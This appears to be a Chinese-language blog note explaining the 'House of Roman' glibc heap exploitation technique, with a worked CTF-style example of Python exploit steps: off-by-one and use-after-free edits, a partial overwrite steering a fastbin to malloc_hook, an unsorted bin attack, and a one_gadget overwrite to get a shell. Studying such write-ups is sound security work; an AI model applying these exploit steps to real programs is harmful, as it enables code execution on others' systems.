---
title: House of Roman
date: '2025-04-20 19:56:02'
updated: '2025-04-27 11:04:43'
---
相当于 fastchunk 伪造和 unsortedbin 机制利用结合，用来绕过 PIE

条件：

可以改到 chunk 的 fd、bk （堆溢出或者 UAF 也可以）

没有 show 等打印堆内容的函数（无法泄露 libc 地址）



大致过程：

1. 利用 unsortedbin 把 chunk 的 fd 和 bk 变成 main_arena 附近的地址（相当于把一个 chunk 放进 unsortedbin 里面再出来），
2. 修改 main_arena 地址的低 12 位(一个半字节)，让 fd 指向 fakechunk 地址(malloc_hook-0x23)，（可以用 UAF 或者堆溢出）
3. 再利用 UAF 或者堆溢出改写 unsortedchunk 的 size，把 fd 带有 fakechunk 地址的 unsortedchunk 大小改成 fastchunk，从而通过 fastbin 申请出 malloc_hook 附近的 fakechunk
4. 最后覆盖到 malloc_hook 篡改为 onegadget 的值

## 例题
分配 3 个 chunk ，在 B + 0x78 处设置 p64(0x61) ， 作用是 fake size , 用于后面 的 fastbin attack

```python
create(0x18,0) # 0x20
create(0xc8,1) # d0
create(0x65,2)  # 0x70
```

```python
info("create 2 chunk, 0x20, 0xd8")
fake = "A"*0x68
fake += p64(0x61)  ## fake size
edit(1,fake)
info("fake")
```

释放掉 B , 然后分配同样大小再次分配到 B , 此时 B+0x10 和 B+0x18 中有 main_arean 的地址。分配 3 个 fastbin ，利用 off by one 修改 B->size = 0x71

```python
free(1)
create(0xc8,1)

create(0x65,3)  # b
create(0x65,15)
create(0x65,18)

over = "A"*0x18  # off by one
over += "\x71"  # set chunk  1's size --> 0x71
edit(0,over)
info("利用 off by one ,  chunk  1's size --> 0x71")
```

生成两个 fastbin ，然后利用 uaf ，部分地址写，把 B 链入到 fastbin

```python
free(2)
free(3)
info("创建两个 0x70 的 fastbin")
heap_po = "\x20"
edit(3,heap_po)
info("把 chunk'1 链入到 fastbin 里面")
```

然后通过修改 B->fd 的低 2 字节， 使得 B->fd= malloc_hook - 0x23

```python
# malloc_hook 上方
malloc_hook_nearly = "\xed\x1a"
edit(1,malloc_hook_nearly)
info("部分写，修改 fastbin->fd ---> malloc_hook")
```

### 重点
上面这个malloc_hook_nearly = "\xed\x1a"的值是要爆破的，因为 libc 地址没有办法泄露出来



然后分配 3 个 0x70 的 chunk ，就可以拿到 malloc_hook 所在的那个 chunk .

```python
create(0x65,0)
create(0x65,0)
create(0x65,0)
```

然后 free 掉 E ，进入 fastbin ，利用 uaf 设置 E->fd = 0 ， 修复了 fastbin

```python
free(15)
edit(15,p64(0x00))
info("再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin")
```

然后是 unsorted bin 攻击，使得 malloc_hook 的值为 main_arena+88

```python
create(0xc8,1)
create(0xc8,1)
create(0x18,2)
create(0xc8,3)
create(0xc8,4)
free(1)
po = "B"*8
po += "\x00\x1b"
edit(1,po)
create(0xc8,1)
info("unsorted bin 使得 malloc_hook 有 libc 的地址")
```

利用 修改 malloc_hook 的低三个字节 ，使得 malloc_hook 为 one_gadget 的地址

```python
over = "R"*0x13   # padding for malloc_hook
over += "\xa4\xd2\xaf"
edit(0,over)
info("malloc_hook to one_gadget")
```

然后 free 两次同一个 chunk ，触发 malloc_printerr ， getshell

```python
free(18)
free(18)
```

